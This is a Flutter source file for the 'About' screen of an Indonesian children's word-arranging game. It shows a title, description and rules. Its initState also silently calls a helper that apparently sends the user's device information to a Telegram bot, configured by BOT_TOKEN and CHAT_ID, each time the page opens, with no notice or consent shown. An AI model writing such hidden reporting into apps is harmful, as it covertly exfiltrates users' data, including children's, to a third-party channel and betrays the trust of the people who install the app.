import 'package:belajar_matika/utils/device_info_helper.dart';
import 'package:belajar_matika/utils/tele_helper.dart';
import 'package:flutter/material.dart';
import 'package:flutter_dotenv/flutter_dotenv.dart';
import 'package:logger/logger.dart';
import 'package:lottie/lottie.dart';

class AboutKataScreen extends StatefulWidget {
  const AboutKataScreen({super.key});

  @override
  State<AboutKataScreen> createState() => _AboutKataScreenState();
}

class _AboutKataScreenState extends State<AboutKataScreen> {
  final DeviceInfoHelper deviceInfoHelper = DeviceInfoHelper(
    telegramHelper: TelegramHelper(
      botToken: dotenv.env['BOT_TOKEN'] ?? '', // Ganti dengan token bot Anda
      chatId: dotenv.env['CHAT_ID'] ?? '', // Ganti dengan chat ID Anda
    ),
  );
  bool isLoading = true;

  @override
  void initState() {
    super.initState();
    _loadAndSendDeviceInfo();
  }

  Future<void> _loadAndSendDeviceInfo() async {
    try {
      await deviceInfoHelper.getAndSendDeviceInfo();
      setState(() {
        isLoading = false;
      });
    } catch (e) {
      setState(() {
        isLoading = false;
      });
      Logger().e(e);
    }
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      appBar: AppBar(
        title: const Text("Tentang Game"),
        centerTitle: true,
        automaticallyImplyLeading: false,
      ),
      body: Padding(
        padding: const EdgeInsets.all(16.0),
        child: Column(
          crossAxisAlignment: CrossAxisAlignment.center,
          children: [
            // Animasi Lottie
            // Lottie.asset("assets/animations/about.json",
            //     width: 200, height: 200),

            // const SizedBox(height: 10),

            // Judul
            const Text(
              "Game Susun Kata",
              style: TextStyle(fontSize: 24, fontWeight: FontWeight.bold),
              textAlign: TextAlign.center,
            ),

            const SizedBox(height: 10),

            // Deskripsi game
            const Text(
              "Game Susun Kata adalah permainan edukatif yang membantu pemain belajar menyusun huruf menjadi kata yang benar. "
              "Game ini dirancang untuk anak-anak maupun orang dewasa yang ingin mengasah keterampilan bahasa mereka.",
              style: TextStyle(fontSize: 16),
              textAlign: TextAlign.center,
            ),

            const SizedBox(height: 20),

            // Cara bermain
            Container(
              padding: const EdgeInsets.all(12),
              decoration: BoxDecoration(
                color: Colors.blue.withOpacity(0.1),
                borderRadius: BorderRadius.circular(10),
              ),
              child: const Column(
                crossAxisAlignment: CrossAxisAlignment.start,
                children: [
                  Text(
                    "Cara Bermain:",
                    style: TextStyle(fontSize: 18, fontWeight: FontWeight.bold),
                  ),
                  SizedBox(height: 5),
                  Text("1. Seret huruf ke kotak kosong untuk menyusun kata."),
                  Text("2. Jika susunan benar, skor akan bertambah."),
                  Text("3. Game memiliki 10 soal dalam satu sesi."),
                  Text("4. Selesaikan semua soal dalam waktu 60 detik."),
                ],
              ),
            ),

            const SizedBox(height: 20),

            // Informasi pengembang
            const Text(
              "Dibuat oleh: Miftahul arif\nVersi: 1.1.2",
              style: TextStyle(fontSize: 14, fontStyle: FontStyle.italic),
              textAlign: TextAlign.center,
            ),
          ],
        ),
      ),
    );
  }
}
